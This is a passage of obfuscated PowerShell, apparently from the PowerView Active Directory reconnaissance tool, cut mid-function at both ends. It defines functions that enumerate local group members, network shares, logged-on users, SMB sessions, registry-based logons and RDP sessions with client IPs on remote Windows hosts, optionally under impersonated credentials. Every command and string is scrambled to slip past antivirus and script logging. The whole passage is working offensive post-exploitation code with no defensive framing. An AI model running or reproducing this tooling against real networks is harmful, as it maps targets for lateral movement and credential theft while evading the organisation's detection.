                            ${M`Emb`ER} | &("{1}{2}{0}{3}" -f 'embe','Add-','M','r') ("{1}{3}{0}{2}"-f 'e','Notep','rty','rop') ("{1}{2}{0}" -f 'erName','Mem','b') ${i`NfO}."LGrmi`2_doMAINAn`D`NamE"
                            ${MeMb`eR} | &("{1}{0}{2}"-f 'em','Add-M','ber') ("{3}{2}{1}{0}"-f 'operty','epr','t','No') 'SID' ${SI`ds`TRINg}
                            ${isGR`ouP} = $(${in`FO}."lgRmI2_S`idus`A`Ge" -eq ("{1}{0}{2}" -f 'ro','SidTypeG','up'))
                            ${m`em`Ber} | &("{2}{1}{0}"-f'ember','dd-M','A') ("{0}{1}{2}"-f 'Not','eproper','ty') ("{2}{1}{0}"-f'oup','sGr','I') ${iS`groUp}
                            ${M`Em`BeR}."PSoBJ`Ect"."t`YPE`NaMeS".("{1}{0}"-f 't','Inser').Invoke(0, ("{4}{1}{3}{2}{0}{8}{6}{9}{5}{7}" -f'al','r','c','View.Lo','Powe','r','up','.API','Gro','Membe'))
                            ${mem`BE`Rs} += ${Mem`BEr}
                        }
                    }

                    
                    ${Nu`lL} = ${Ne`Tap`I32}::("{1}{0}{2}{4}{3}" -f 'et','N','Api','erFree','Buff').Invoke(${Pt`RiN`Fo})

                    
                    ${MA`C`HIN`esiD} = ${ME`M`BERs} | &("{3}{2}{0}{1}" -f 'ec','t','bj','Where-O') {${_}."S`ID" -match ("{2}{0}{1}" -f '-5','00','.*') -or (${_}."S`Id" -match ("{0}{2}{1}"-f'.','-501','*'))} | &("{3}{1}{2}{0}" -f'ject','t','-Ob','Selec') -Expand ("{0}{1}"-f'SI','D')
                    if (${Mach`InE`SiD}) {
                        ${m`AC`H`ineSId} = ${Mac`hi`NesId}.("{2}{0}{1}"-f'rin','g','Subst').Invoke(0, ${m`AcHI`NeS`ID}.("{1}{0}{2}" -f 'IndexO','Last','f').Invoke('-'))

                        ${ME`mb`ERS} | &("{1}{0}{2}"-f'bje','ForEach-O','ct') {
                            if (${_}."S`iD" -match ${Mac`h`IneSID}) {
                                ${_} | &("{1}{2}{0}{3}"-f 'e','Ad','d-Memb','r') ("{2}{1}{0}" -f'perty','o','Notepr') ("{2}{0}{1}" -f 'ma','in','IsDo') ${Fal`SE}
                            }
                            else {
                                ${_} | &("{3}{2}{0}{1}"-f'b','er','em','Add-M') ("{1}{2}{0}{3}" -f 'er','Notep','rop','ty') ("{0}{1}" -f 'Is','Domain') ${T`RUE}
                            }
                        }
                    }
                    else {
                        ${mEmb`E`RS} | &("{4}{2}{1}{3}{0}"-f 't','a','E','ch-Objec','For') {
                            if (${_}."S`iD" -notmatch ("{0}{1}{2}"-f 'S','-1-5-','21')) {
                                ${_} | &("{0}{2}{1}" -f 'Ad','r','d-Membe') ("{0}{3}{1}{2}" -f'Note','rop','erty','p') ("{2}{0}{1}" -f'a','in','IsDom') ${f`AL`sE}
                            }
                            else {
                                ${_} | &("{1}{2}{0}" -f 'r','Add-M','embe') ("{0}{2}{1}" -f'N','operty','otepr') ("{1}{0}" -f'in','IsDoma') ("{1}{0}" -f 'NKNOWN','U')
                            }
                        }
                    }
                    ${M`eMbE`Rs}
                }
                else {
                    &("{1}{0}{3}{2}" -f'te-Ve','Wri','e','rbos') "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
                }
            }
            else {
                
                try {
                    ${G`RO`UpP`RoviD`ER} = [ADSI]"WinNT://$Computer/$GroupName,group"

                    ${gRO`Upp`RoVI`DeR}."p`sbAsE"."IN`VoKe"(("{1}{2}{0}"-f 's','Mem','ber')) | &("{2}{1}{0}{3}"-f 'bj','rEach-O','Fo','ect') {

                        ${MEM`Ber} = &("{0}{2}{1}"-f'New-','ect','Obj') ("{2}{1}{0}"-f'ct','SObje','P')
                        ${MEm`BeR} | &("{2}{3}{0}{1}"-f 'e','r','A','dd-Memb') ("{0}{2}{1}"-f'N','operty','otepr') ("{0}{1}{3}{2}" -f'Comput','erN','e','am') ${CO`M`PUTER}
                        ${M`e`Mber} | &("{0}{2}{1}"-f'Add','r','-Membe') ("{0}{1}{3}{2}" -f'No','tepro','y','pert') ("{0}{1}{2}" -f'G','r','oupName') ${gr`Ou`pn`Ame}

                        ${lO`CA`lUSEr} = ([ADSI]${_})
                        ${AD`Spa`Th} = ${lOca`LU`sEr}.("{2}{0}{1}" -f 'v','okeGet','In').Invoke(("{0}{2}{1}" -f 'AdsP','h','at')).("{0}{2}{1}"-f'R','e','eplac').Invoke(("{0}{1}"-f 'WinNT:','//'), '')
                        ${ISgr`O`UP} = (${locAlu`S`ER}."Sc`H`EMaClAssN`Ame" -like ("{1}{0}" -f'p','grou'))

                        if((  ( &("{0}{1}"-f'gc','I')  ("{3}{1}{2}{0}"-f'g51','ari','aBLe:','v') )."V`AlUE"::("{1}{2}{0}" -f 's','Matc','he').Invoke(${ADSP`A`Th}, '/'))."CoU`Nt" -eq 1) {
                            
                            ${mEMbE`RI`sdO`m`Ain} = ${Tr`Ue}
                            ${n`Ame} = ${A`dSPAtH}.("{2}{1}{0}" -f'e','plac','Re').Invoke('/', '\')
                        }
                        else {
                            
                            ${mE`M`BERI`SdOM`AIn} = ${fA`LSE}
                            ${na`mE} = ${adSP`AtH}.("{0}{2}{1}"-f'S','string','ub').Invoke(${a`DSpA`Th}.("{0}{2}{1}" -f'In','f','dexO').Invoke('/')+1).("{0}{2}{1}"-f 'R','ace','epl').Invoke('/', '\')
                        }

                        ${me`M`BEr} | &("{0}{2}{1}"-f 'Add','er','-Memb') ("{0}{3}{2}{1}"-f 'Notep','ty','er','rop') ("{2}{1}{0}"-f 'Name','count','Ac') ${n`AME}
                        ${ME`mBEr} | &("{2}{0}{1}" -f'mbe','r','Add-Me') ("{2}{0}{3}{1}" -f'oteprope','ty','N','r') 'SID' ((&("{1}{2}{0}" -f 'bject','New-','O') ("{10}{11}{12}{8}{0}{7}{9}{2}{3}{5}{1}{6}{4}"-f'u','ntif','cipal.Securi','ty','r','Ide','ie','rity.Pri','c','n','Syst','em.S','e')(${l`OcaL`USEr}.("{1}{0}{2}" -f'Ge','Invoke','t').Invoke(("{0}{1}" -f'Obj','ectSID')),0))."vA`luE")
                        ${M`eMBEr} | &("{0}{1}{2}"-f 'Add-Me','mbe','r') ("{1}{2}{3}{0}" -f 'ty','No','t','eproper') ("{1}{0}{2}"-f'o','IsGr','up') ${i`Sgr`Oup}
                        ${mem`B`ER} | &("{0}{2}{1}" -f 'Add-','mber','Me') ("{2}{0}{1}"-f'rope','rty','Notep') ("{1}{0}" -f'Domain','Is') ${meMB`eRi`s`do`mAIn}

                        
                        
                        
                        
                        

                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        

                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        

                        ${m`Emb`ER}
                    }
                }
                catch {
                    &("{0}{2}{3}{1}{4}" -f'Wri','os','te-Ve','rb','e') ('[Get-NetL'+'ocal'+'Gr'+'oupM'+'embe'+'r] '+'E'+'rr'+'or '+'f'+'or '+"$Computer "+': '+"$_")
                }
            }
        }
    }
    
    END {
        if (${LO`GoN`T`OkeN}) {
            &("{0}{1}{2}{4}{5}{3}"-f'Invok','e-Re','ve','Self','r','tTo') -TokenHandle ${Log`o`Nt`OKEN}
        }
    }
}


function G`eT-N`ETsh`ARe {


    [OutputType({"{4}{1}{0}{3}{2}" -f're','View.Sha','fo','In','Power'})]
    [CmdletBinding()]
    Param(
        [Parameter(PoSitioN = 0, ValUefRompiPeLinE = ${tr`Ue}, valUEfRoMpIPeliNEbYPRoPeRtYNaME = ${Tr`UE})]
        [Alias({"{0}{2}{1}" -f'Ho','tName','s'}, {"{3}{0}{2}{1}" -f 'n','e','am','dnshost'}, {"{0}{1}" -f 'n','ame'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${c`omp`UT`erNaME} = ("{2}{0}{1}" -f 'ho','st','local'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`eD`En`TiaL} =   ( &("{1}{2}{0}"-f 'e','var','IaBL') ("{1}{0}"-f'R0VK','5'))."v`Alue"::"E`MpTY"
    )

    BEGIN {
        if (${psBOUn`DparAm`ete`RS}[("{2}{3}{0}{1}"-f'ntia','l','Cre','de')]) {
            ${lOGONt`O`Ken} = &("{0}{2}{1}{3}{4}" -f 'Inv','UserImpe','oke-','rso','nation') -Credential ${cR`e`DeNtiAl}
        }
    }

    PROCESS {
        ForEach (${C`OMP`UTER} in ${C`oMP`U`TErNa`mE}) {
            
            ${q`UERYLEV`el} = 1
            ${ptrIN`Fo} =  (&("{1}{3}{0}{2}" -f'-V','g','aRiABLe','Et') ("oy"+"9")  -VALueon  )::"z`eRO"
            ${e`NtrIe`s`ReAD} = 0
            ${T`ot`ALR`eAd} = 0
            ${r`E`SUmEhA`N`dLe} = 0

            
            ${Re`sulT} = ${N`eT`API32}::"nE`TsHa`R`EEnuM"(${C`oM`PUTeR}, ${Que`RY`l`EVeL}, [ref]${P`TRI`NFo}, -1, [ref]${e`N`TRIeSre`Ad}, [ref]${TOta`l`R`eAd}, [ref]${R`E`SumEhaND`LE})

            
            ${OF`FS`et} = ${ptRi`N`Fo}.("{1}{0}{2}"-f 'Int','To','64').Invoke()

            
            if ((${rES`U`lt} -eq 0) -and (${Of`FSEt} -gt 0)) {

                
                ${I`NcRe`mEnT} = ${SHARE`_IN`F`o_1}::("{1}{0}{2}"-f 'tSiz','Ge','e').Invoke()

                
                for (${I} = 0; (${I} -lt ${eNtrIE`s`ReAd}); ${i}++) {
                    
                    ${newIn`T`p`Tr} = &("{1}{0}{3}{2}"-f'ew','N','bject','-O') ("{0}{2}{1}"-f 'Sy','.Intptr','stem') -ArgumentList ${O`FFs`Et}
                    ${In`FO} = ${ne`WinT`PTR} -as ${ShAr`e_`in`Fo_1}

                    
                    ${s`haRE} = ${I`NFo} | &("{1}{2}{3}{0}" -f'ct','Sele','ct-Obj','e') ('*')
                    ${SHa`RE} | &("{3}{0}{2}{1}" -f 'dd-M','r','embe','A') ("{2}{0}{1}" -f 'per','ty','Notepro') ("{1}{2}{0}{3}"-f'rNa','Comput','e','me') ${coM`Pu`TeR}
                    ${sHA`Re}."PSoBjE`CT"."tYpE`N`AMEs".("{0}{1}{2}" -f'In','s','ert').Invoke(0, ("{2}{0}{1}{3}" -f'erVi','ew.ShareI','Pow','nfo'))
                    ${OFfs`eT} = ${neW`i`NTPTr}.("{2}{1}{0}" -f't64','n','ToI').Invoke()
                    ${Offs`eT} += ${In`crEME`Nt}
                    ${sH`ARE}
                }

                
                ${Nu`Ll} = ${NEtaP`i`32}::("{0}{3}{1}{4}{2}" -f 'Ne','ApiBuffe','ee','t','rFr').Invoke(${PT`R`INfO})
            }
            else {
                &("{0}{2}{1}{3}" -f'Wri','e-','t','Verbose') "[Get-NetShare] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
    }

    END {
        if (${lO`G`ONTo`keN}) {
            &("{0}{3}{2}{5}{4}{1}" -f'Inv','f','e-Reve','ok','l','rtToSe') -TokenHandle ${l`oGONtO`k`en}
        }
    }
}


function GEt-`N`etLoGgeDON {


    [OutputType({"{1}{0}{3}{2}{4}{5}" -f 'owerVi','P','w.Log','e','gedOnUser','Info'})]
    [CmdletBinding()]
    Param(
        [Parameter(poSITiOn = 0, VALUeFRoMPipelIne = ${T`RUe}, ValuEFRoMPipeLiNEbyproPERtYNamE = ${T`RuE})]
        [Alias({"{2}{0}{1}"-f 't','Name','Hos'}, {"{2}{0}{1}"-f 'host','name','dns'}, {"{1}{0}" -f 'e','nam'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${cOmPU`T`E`R`NAme} = ("{1}{2}{3}{0}" -f 'ost','lo','ca','lh'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`REDEN`TiAL} =   ( &("{1}{2}{3}{0}" -f'ABLE','Get-v','ar','i') ('5R0v'+'K')  )."v`AlUE"::"E`mpTy"
    )

    BEGIN {
        if (${pSbOu`NdPaRAMET`e`Rs}[("{0}{2}{1}"-f'Cre','l','dentia')]) {
            ${L`OGO`NTOkeN} = &("{0}{6}{4}{1}{2}{3}{7}{5}" -f'Inv','-UserImpers','o','nat','ke','on','o','i') -Credential ${cRE`De`N`TiaL}
        }
    }

    PROCESS {
        ForEach (${ComP`Ut`Er} in ${COMP`UtEr`NAME}) {
            
            ${qu`e`RylevEL} = 1
            ${p`Tr`InfO} =  (&("{1}{3}{2}{0}" -f'e','Get-var','Bl','IA') ("{0}{1}" -f'O','y9'))."val`Ue"::"ze`Ro"
            ${EN`T`RIEsR`EAd} = 0
            ${T`OTaLR`E`Ad} = 0
            ${rESume`HAnD`lE} = 0

            
            ${R`esUlT} = ${NEt`ApI`32}::"NE`Tw`KS`TAUSeRe`Num"(${COM`PuTEr}, ${Q`UEr`YL`Evel}, [ref]${ptr`I`NFO}, -1, [ref]${E`NtrI`e`SreAd}, [ref]${Tot`A`LR`EAd}, [ref]${ResUMe`H`An`DlE})

            
            ${oF`FS`ET} = ${pTRI`N`FO}.("{0}{1}{2}" -f 'ToIn','t6','4').Invoke()

            
            if ((${r`E`SulT} -eq 0) -and (${Of`F`sET} -gt 0)) {

                
                ${In`cReM`Ent} = ${wK`St`A_UsER_`infO`_1}::("{1}{0}" -f 'e','GetSiz').Invoke()

                
                for (${i} = 0; (${i} -lt ${E`NTRi`ESreAd}); ${I}++) {
                    
                    ${N`Ewin`TpTr} = &("{1}{0}{2}"-f 'w-Obje','Ne','ct') ("{0}{2}{1}"-f 'Sy','.Intptr','stem') -ArgumentList ${OF`FSET}
                    ${I`NfO} = ${new`intp`Tr} -as ${WkStA`_usEr_`inFO`_1}

                    
                    ${l`oGg`EDon} = ${i`Nfo} | &("{3}{1}{2}{0}"-f'ct','lec','t-Obje','Se') ('*')
                    ${loGgE`d`ON} | &("{1}{2}{3}{0}"-f 'mber','Add-','M','e') ("{1}{2}{0}{3}"-f'o','N','otepr','perty') ("{1}{0}{2}" -f 'puter','Com','Name') ${COMp`UT`Er}
                    ${LoGg`e`don}."ps`objeCT"."TYp`e`NameS".("{0}{1}" -f'Inse','rt').Invoke(0, ("{1}{3}{7}{6}{2}{4}{5}{0}"-f'fo','Powe','dOnUs','rVie','er','In','ogge','w.L'))
                    ${of`FseT} = ${nEW`In`TpTR}.("{1}{0}{2}"-f '6','ToInt','4').Invoke()
                    ${oF`FsEt} += ${in`CRem`enT}
                    ${lOG`gEdOn}
                }

                
                ${Nu`LL} = ${ne`TaP`i`32}::("{4}{1}{0}{3}{2}" -f 'Buf','etApi','ee','ferFr','N').Invoke(${ptR`I`NFO})
            }
            else {
                &("{0}{2}{1}" -f'Write-Ve','ose','rb') "[Get-NetLoggedon] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
    }

    END {
        if (${LogO`NtO`KEN}) {
            &("{2}{1}{3}{4}{0}"-f'lf','vok','In','e-R','evertToSe') -TokenHandle ${L`OGONt`OK`En}
        }
    }
}


function G`et-NeT`SE`SsIon {


    [OutputType({"{0}{2}{1}{3}"-f 'Powe','.SessionInf','rView','o'})]
    [CmdletBinding()]
    Param(
        [Parameter(posiTIoN = 0, VAlUEfrOmPIpeLine = ${T`RuE}, VAlUEFROMpIpElINEBYPROPeRtyNAMe = ${T`RuE})]
        [Alias({"{1}{2}{0}"-f'me','Hos','tNa'}, {"{3}{0}{2}{1}"-f'nshos','ame','tn','d'}, {"{0}{1}" -f 'nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${comPutE`RnA`me} = ("{1}{0}"-f'lhost','loca'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`E`denTIAL} =  ( &("{3}{1}{2}{0}" -f 'E','T-','VAriaBL','GE')  ("{0}{1}" -f'5r0V','K')  )."v`ALue"::"e`mPtY"
    )

    BEGIN {
        if (${pSBOUnd`pArAM`e`Te`Rs}[("{3}{0}{1}{2}" -f'de','nti','al','Cre')]) {
            ${L`ogo`NTOKeN} = &("{1}{4}{0}{2}{3}" -f 'r','I','sona','tion','nvoke-UserImpe') -Credential ${Cre`DENt`iaL}
        }
    }

    PROCESS {
        ForEach (${c`omP`UteR} in ${CO`mpU`T`ErN`AME}) {
            
            ${QuERYLe`V`eL} = 10
            ${PT`Rin`Fo} =   (  &("{1}{0}"-f'eM','get-IT')  ("{1}{0}{3}{2}" -f'aBLE:','VaRi','y9','o')  )."VA`LuE"::"Z`ErO"
            ${enT`R`iesread} = 0
            ${T`oTA`lre`Ad} = 0
            ${Resu`mE`h`AndLe} = 0

            
            ${Re`S`ULt} = ${net`AP`I32}::("{0}{3}{2}{4}{1}"-f 'NetS','num','on','essi','E').Invoke(${C`o`mPuTeR}, '', ${USEr`Na`mE}, ${Q`UeRY`LEVEL}, [ref]${PTr`INFo}, -1, [ref]${E`NT`Ri`EsREad}, [ref]${To`TAl`ReAD}, [ref]${R`eSUM`e`HanD`LE})

            
            ${O`Ffs`Et} = ${p`Tr`inFo}.("{0}{1}" -f'T','oInt64').Invoke()

            
            if ((${R`esu`LT} -eq 0) -and (${o`FF`SeT} -gt 0)) {

                
                ${I`NCre`mEnT} = ${S`e`SsiON_I`NFO_`10}::("{0}{1}" -f 'GetSiz','e').Invoke()

                
                for (${I} = 0; (${i} -lt ${eN`T`Ri`EsreaD}); ${I}++) {
                    
                    ${nE`wIntp`Tr} = &("{2}{1}{0}"-f'ect','bj','New-O') ("{0}{2}{1}" -f'S','tr','ystem.Intp') -ArgumentList ${o`FF`SEt}
                    ${in`FO} = ${n`EwInt`ptR} -as ${seSSion_I`NF`O_10}

                    
                    ${SeSS`i`oN} = ${i`NfO} | &("{3}{1}{2}{0}" -f 'Object','lect','-','Se') ('*')
                    ${S`ESs`IoN} | &("{1}{2}{0}" -f'mber','Add-','Me') ("{3}{1}{2}{0}" -f'roperty','ote','p','N') ("{2}{1}{0}"-f'ame','uterN','Comp') ${c`omPU`TeR}
                    ${SE`S`SiOn}."pSoBjE`ct"."ty`PE`NAmeS".("{0}{1}" -f 'Ins','ert').Invoke(0, ("{3}{0}{2}{4}{5}{1}"-f'ew.S','o','ession','PowerVi','In','f'))
                    ${OFF`seT} = ${NewIN`T`p`TR}.("{0}{1}{2}" -f'T','oI','nt64').Invoke()
                    ${OFfs`Et} += ${In`cr`em`eNT}
                    ${sE`S`sIOn}
                }

                
                ${NU`Ll} = ${ne`Ta`pi`32}::("{3}{0}{2}{4}{1}" -f 't','ree','Ap','Ne','iBufferF').Invoke(${p`T`RINfO})
            }
            else {
                &("{1}{0}{2}" -f'r','W','ite-Verbose') "[Get-NetSession] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
    }


    END {
        if (${loG`o`NT`OKeN}) {
            &("{5}{2}{4}{3}{1}{0}"-f 'oSelf','ertT','nvoke-','ev','R','I') -TokenHandle ${logo`N`TOK`eN}
        }
    }
}


function gET-`ReG`l`oGGED`On {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{2}{0}{1}{3}" -f 'houldP','ro','SS','cess','P'}, '')]
    [OutputType({"{3}{4}{2}{1}{5}{0}" -f 'er','gedOnU','og','Po','werView.RegL','s'})]
    [CmdletBinding()]
    Param(
        [Parameter(POSITIoN = 0, ValuEfrOmpIpeLiNe = ${t`RuE}, vALuefrOmPiPeliNEByPrOPerTYNaME = ${T`Rue})]
        [Alias({"{2}{1}{0}"-f'e','tNam','Hos'}, {"{1}{2}{3}{0}"-f'e','dnsho','s','tnam'}, {"{1}{0}"-f 'me','na'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${c`oM`PUTe`RnaME} = ("{2}{0}{1}"-f 'al','host','loc')
    )

    BEGIN {
        if (${PsBouND`pa`RaMete`RS}[("{1}{0}{3}{2}" -f 'ed','Cr','tial','en')]) {
            ${lOG`On`Token} = &("{4}{3}{0}{2}{1}{5}" -f 'I','rs','mpe','voke-User','In','onation') -Credential ${cRe`D`enTiAL}
        }
    }

    PROCESS {
        ForEach (${c`OmpUT`ER} in ${co`mP`UT`E`RnAME}) {
            try {
                
                ${R`eg} =  (&("{1}{2}{0}" -f 'Ble','Var','iA') ("{1}{0}" -f 's','Jt') -VALuEONL)::("{1}{0}{2}{3}"-f'teBa','OpenRemo','se','Key').Invoke(("{0}{1}"-f'User','s'), "$ComputerName")

                
                ${r`eg}.("{1}{2}{3}{0}"-f'KeyNames','Ge','t','Sub').Invoke() | &("{3}{0}{2}{1}" -f 'e','Object','re-','Wh') { ${_} -match (('S'+'-1-5-21'+'-'+'[0-9'+']+'+'-['+'0-'+'9]+-[0-9]'+'+-[0'+'-'+'9'+']+a9H')."Repl`Ace"(([Char]97+[Char]57+[Char]72),[String][Char]36)) } | &("{1}{3}{0}{4}{2}" -f '-','ForEac','bject','h','O') {
                    ${uS`ERn`A`Me} = &("{0}{1}{3}{2}"-f 'Conver','tF','m-SID','ro') -ObjectSID ${_} -OutputType ("{1}{0}{3}{2}" -f'm','Do','imple','ainS')

                    if (${Us`E`RNaME}) {
                        ${use`Rn`Ame}, ${USER`D`omAin} = ${USE`R`Name}.("{1}{0}"-f'plit','S').Invoke('@')
                    }
                    else {
                        ${U`SEr`NAME} = ${_}
                        ${U`s`ErdomAIN} = ${N`ULl}
                    }

                    ${RE`GloG`GeD`ONUsEr} = &("{0}{1}{2}" -f'New-','Obj','ect') ("{2}{1}{0}"-f'ject','b','PSO')
                    ${rEGLog`gE`dO`Nuser} | &("{1}{2}{0}" -f 'er','Add','-Memb') ("{1}{2}{0}"-f'erty','Notep','rop') ("{2}{0}{1}{3}"-f'omputerNa','m','C','e') "$ComputerName"
                    ${r`e`GLoggeDO`N`USER} | &("{2}{0}{1}{3}" -f 'd','-Me','Ad','mber') ("{2}{1}{0}" -f'y','otepropert','N') ("{2}{1}{0}"-f'omain','rD','Use') ${U`SerDOm`Ain}
                    ${rEGlOg`g`Edo`NUSer} | &("{1}{0}{2}" -f '-M','Add','ember') ("{2}{0}{1}{3}"-f'tepro','pe','No','rty') ("{2}{0}{1}" -f 'Na','me','User') ${uSE`RNa`ME}
                    ${r`E`GlOg`g`eDOnuSeR} | &("{2}{0}{1}"-f 'd','d-Member','A') ("{1}{2}{0}{3}"-f 'o','N','otepr','perty') ("{0}{1}"-f'UserSI','D') ${_}
                    ${re`GLoGg`EDoNUS`Er}."PS`Ob`jecT"."ty`P`eNA`mes".("{0}{1}" -f'Ins','ert').Invoke(0, ("{1}{2}{4}{3}{0}" -f'edOnUser','PowerVie','w','egLogg','.R'))
                    ${R`eGLogGE`DONu`s`Er}
                }
            }
            catch {
                &("{1}{0}{2}"-f'ite-Verbo','Wr','se') ('[G'+'et-'+'RegLo'+'g'+'ge'+'dOn] '+'E'+'rror '+'op'+'e'+'ning '+'remo'+'t'+'e '+'r'+'egistr'+'y '+'o'+'n '+"'$ComputerName' "+': '+"$_")
            }
        }
    }

    END {
        if (${lo`GONT`OKen}) {
            &("{2}{3}{1}{0}"-f'Self','evertTo','I','nvoke-R') -TokenHandle ${LO`GonT`okEN}
        }
    }
}


function g`e`T-`NeTrDPsess`ION {


    [OutputType({"{5}{3}{2}{4}{6}{1}{0}"-f 'fo','n','w.R','ie','DPSessio','PowerV','nI'})]
    [CmdletBinding()]
    Param(
        [Parameter(posItIoN = 0, vaLUefrOMPIPElINE = ${tr`UE}, ValUefROMPipElINebYpRopeRTYnAME = ${tr`Ue})]
        [Alias({"{0}{1}" -f 'HostNam','e'}, {"{0}{2}{1}"-f 'dnshost','e','nam'}, {"{0}{1}" -f'na','me'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${co`mPUT`e`RnAme} = ("{1}{0}"-f 'ocalhost','l'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRed`eN`TiAL} =  (&("{2}{1}{3}{0}" -f 'riAbLe','t-','GE','va')  ('5R'+'0vK'))."VAL`Ue"::"EM`PTy"
    )

    BEGIN {
        if (${PsbOUnd`ParAmE`T`erS}[("{1}{2}{3}{0}" -f 'l','Crede','nti','a')]) {
            ${LO`G`onT`oKeN} = &("{3}{1}{5}{2}{4}{0}"-f'n','-U','persona','Invoke','tio','serIm') -Credential ${C`REDe`NTI`Al}
        }
    }

    PROCESS {
        ForEach (${cOMp`U`TEr} in ${Comput`E`Rn`Ame}) {

            
            ${h`A`NDlE} = ${WtsAP`I`32}::("{2}{3}{1}{0}" -f 'Ex','er','WTS','OpenServ').Invoke(${c`O`mPu`Ter})

            
            if (${Han`D`Le} -ne 0) {

                
                ${P`psess`IoNINFO} =  ${O`y9}::"z`eRo"
                ${Pco`UnT} = 0

                
                ${rES`ULt} = ${wtS`ApI32}::"wT`S`EnumerATE`SESSiOns`eX"(${h`AndLe}, [ref]1, 0, [ref]${PPsessI`o`N`INFo}, [ref]${PC`o`UNT});${la`s`T`eRROR} =  ${F`18t}::("{2}{0}{1}{3}{4}"-f 'stW','in32','GetLa','Erro','r').Invoke()

                
                ${O`FF`set} = ${Pp`se`SSio`NI`NfO}.("{1}{0}{2}"-f't6','ToIn','4').Invoke()

                if ((${r`esulT} -ne 0) -and (${O`F`FsEt} -gt 0)) {

                    
                    ${iNc`R`EMEnT} = ${W`Ts_SesSion`_`I`N`FO_1}::("{2}{1}{0}" -f'ze','tSi','Ge').Invoke()

                    
                    for (${I} = 0; (${i} -lt ${P`CouNT}); ${I}++) {

                        
                        ${N`EW`Intptr} = &("{1}{0}{2}" -f'ew','N','-Object') ("{1}{4}{0}{2}{3}"-f'e','Sys','m.Intpt','r','t') -ArgumentList ${oF`Fs`ET}
                        ${In`FO} = ${n`e`W`intpTr} -as ${wts_`seS`S`IoN_info`_1}

                        ${rDps`EsS`IOn} = &("{3}{0}{2}{1}"-f'O','t','bjec','New-') ("{2}{1}{0}" -f 'ct','e','PSObj')

                        if (${In`Fo}."PhOsTN`Ame") {
                            ${r`D`pSESSIon} | &("{0}{1}{2}" -f'Add-Mem','b','er') ("{2}{0}{1}" -f'teprop','erty','No') ("{1}{0}{2}"-f 'puterNa','Com','me') ${i`NFo}."p`HoST`NA`ME"
                        }
                        else {
                            
                            ${R`dPSES`s`Ion} | &("{0}{2}{1}" -f 'Ad','-Member','d') ("{2}{1}{3}{0}"-f'rty','otep','N','rope') ("{0}{2}{1}"-f'Comp','me','uterNa') ${com`p`Uter}
                        }

                        ${Rdp`sESs`iOn} | &("{2}{0}{1}" -f 'Membe','r','Add-') ("{1}{3}{0}{2}" -f 'r','N','ty','oteprope') ("{1}{0}{2}"-f 'essionNam','S','e') ${In`FO}."pSe`SSio`NNamE"

                        if ($(-not ${i`NFO}."pd`o`MaI`NNamE") -or (${I`Nfo}."PdomA`iN`NAME" -eq '')) {
                            
                            ${r`Dp`SESsi`on} | &("{0}{2}{1}"-f 'Ad','ber','d-Mem') ("{1}{2}{0}"-f'roperty','Not','ep') ("{0}{1}" -f 'UserNam','e') "$($Info.pUserName)"
                        }
                        else {
                            ${r`dps`ESSIOn} | &("{3}{0}{1}{2}"-f'd-M','emb','er','Ad') ("{1}{0}{3}{2}"-f 'ep','Not','y','ropert') ("{0}{1}" -f'Use','rName') "$($Info.pDomainName)\$($Info.pUserName)"
                        }

                        ${R`dPsES`Sion} | &("{1}{2}{0}{3}" -f '-Mem','Ad','d','ber') ("{1}{0}{2}" -f 'teproper','No','ty') 'ID' ${i`NfO}."sES`s`iONid"
                        ${rdPS`Es`SIOn} | &("{2}{0}{1}" -f'-M','ember','Add') ("{0}{3}{1}{2}" -f 'Not','oper','ty','epr') ("{0}{1}"-f 'S','tate') ${iN`FO}."sT`AtE"

                        ${pPBUff`er} =  ${O`Y9}::"Z`eRO"
                        ${PB`YT`EsRETUR`Ned} = 0

                        
                        
                        ${r`E`sult2} = ${WT`S`A`pi32}::"WTSqUery`s`esSIONINfor`matI`On"(${h`A`NDLE}, ${i`NFo}."SEs`si`on`iD", 14, [ref]${Ppb`U`FFer}, [ref]${P`B`YTesRe`Turn`ED});${LAS`TE`Rr`OR2} =   (&("{0}{1}" -f 'D','Ir') ("vARia"+"blE:f"+"18t")  )."v`Alue"::("{1}{0}{3}{2}" -f'e','G','Win32Error','tLast').Invoke()

                        if (${rE`SuL`T2} -eq 0) {
                            &("{1}{0}{2}" -f 'te-Ver','Wri','bose') "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError2).Message) "
                        }
                        else {
                            ${ofF`SE`T2} = ${P`Pbu`FFER}.("{1}{0}{2}"-f'oI','T','nt64').Invoke()
                            ${N`Ewi`N`TPtr2} = &("{1}{0}{2}" -f 'ec','New-Obj','t') ("{2}{1}{0}" -f 'r','t','System.Intp') -ArgumentList ${OffS`E`T2}
                            ${iNf`O2} = ${NEWi`NT`PTR2} -as ${wts_`c`Lien`T`_ad`dResS}

                            ${sour`CeIp} = ${iN`F`O2}."Ad`DR`EsS"
                            if (${s`ouRc`Eip}[2] -ne 0) {
                                ${So`UrCe`IP} = [String]${SO`U`RC`eip}[2]+'.'+[String]${s`O`Urc`eIp}[3]+'.'+[String]${SO`U`RCEiP}[4]+'.'+[String]${SOUr`c`eIP}[5]
                            }
                            else {
                                ${SO`U`RC`EIP} = ${n`ULL}
                            }

                            ${rdPs`Es`si`On} | &("{1}{0}{2}"-f'-Memb','Add','er') ("{2}{1}{0}" -f'ty','teproper','No') ("{1}{0}{2}" -f 'ource','S','IP') ${SOURC`eip}
